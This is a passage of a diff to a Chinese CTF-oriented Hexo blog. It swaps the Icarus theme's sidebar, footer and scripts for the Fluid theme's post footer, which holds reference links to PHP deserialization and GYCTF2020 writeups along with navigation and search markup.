dateTime="2021-05-28T04:36:53.000Z">2021-05-28</time></p><p class="title"><a href="/2021/05/28/ESP%E5%AE%9A%E5%BE%8B%E5%92%8C%E5%8A%A8%E6%80%81%E8%84%B1UPX%E5%A3%B3/">ESP定律和动态脱UPX壳</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-05-23T06:38:50.000Z">2021-05-23</time></p><p class="title"><a href="/2021/05/23/Servlet%E5%AD%A6%E4%B9%A0/">Servlet学习</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-05-18T06:04:20.000Z">2021-05-18</time></p><p class="title"><a href="/2021/05/18/CISCN2021-web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/">CISCN2021 web部分题解</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-05-14T10:17:39.000Z">2021-05-14</time></p><p class="title"><a href="/2021/05/14/MRCTF2020-EzpopRevenge/">MRCTF2020-EzpopRevenge</a></p></div></article></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2021/05/"><span class="level-start"><span class="level-item">五月 2021</span></span><span class="level-end"><span class="level-item tag">5</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/04/"><span class="level-start"><span class="level-item">四月 2021</span></span><span class="level-end"><span class="level-item tag">16</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/03/"><span class="level-start"><span class="level-item">三月 2021</span></span><span class="level-end"><span class="level-item tag">10</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/02/"><span class="level-start"><span class="level-item">二月 2021</span></span><span class="level-end"><span class="level-item tag">8</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/01/"><span class="level-start"><span class="level-item">一月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/12/"><span class="level-start"><span class="level-item">十二月 2020</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/11/"><span class="level-start"><span class="level-item">十一月 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><!--!--><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">订阅更新</h3><form action="https://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open(&#039;https://feedburner.google.com/fb/a/mailverify?uri=&#039;,&#039;popupwindow&#039;,&#039;scrollbars=yes,width=550,height=520&#039;);return true"><input type="hidden" value="" name="uri"><input type="hidden" name="loc" value="en_US"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="订阅"></div></div></form></div></div></div><div class="card widget"><div class="card-content"><div class="notification is-danger">You need to set <code>client_id</code> and <code>slot_id</code> to show this AD unit. Please set it in <code>_config.yml</code>.</div></div></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/logo.svg" alt="Hexo" height="28"></a><p class="is-size-7"><span>&copy; 2021 John Doe</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" async></script><script>moment.locale("zh-CN");</script><script>var IcarusThemeSettings = {
-            article: {
-                highlight: {
-                    clipboard: true,
-                    fold: 'unfolded'
-                }
-            }
-        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
-      window.cookieconsent.initialise({
-        type: "info",
-        theme: "edgeless",
-        static: false,
-        position: "bottom-left",
-        content: {
-          message: "此网站使用Cookie来改善您的体验。",
-          dismiss: "知道了！",
-          allow: "允许使用Cookie",
-          deny: "拒绝",
-          link: "了解更多",
-          policy: "Cookie政策",
-          href: "https://www.cookiesandyou.com/",
-        },
-        palette: {
-          popup: {
-            background: "#edeff5",
-            text: "#838391"
-          },
-          button: {
-            background: "#4b81e8"
-          },
-        },
-      });
-    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
-            if (typeof $.fn.lightGallery === 'function') {
-                $('.article').lightGallery({ selector: '.gallery-item' });
-            }
-            if (typeof $.fn.justifiedGallery === 'function') {
-                if ($('.justified-gallery > p > .gallery-item').length) {
-                    $('.justified-gallery > p > .gallery-item').unwrap();
-                }
-                $('.justified-gallery').justifiedGallery();
-            }
-        });</script><!--!--><!--!--><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
-            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
-        });</script></body></html>
+<p><a href="https://tiaonmmn.github.io/2020/03/04/BUUOJ%E5%88%B7%E9%A2%98-Web-GYCTF2020-Easyphp/">https://tiaonmmn.github.io/2020/03/04/BUUOJ%E5%88%B7%E9%A2%98-Web-GYCTF2020-Easyphp/</a></p>
+<p><a href="https://ctf.ieki.xyz/buuoj/gyctf-2020.html">https://ctf.ieki.xyz/buuoj/gyctf-2020.html</a></p>
+<p><a href="https://www.1ight.top/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB/">https://www.1ight.top/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB/</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/03/30/2020-%E6%96%B0%E6%98%A5%E7%BA%A2%E5%8C%85%E9%A2%981/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">2020 新春红包题1</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/03/25/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/">
+                        <span class="hidden-mobile">phar反序列化学习</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
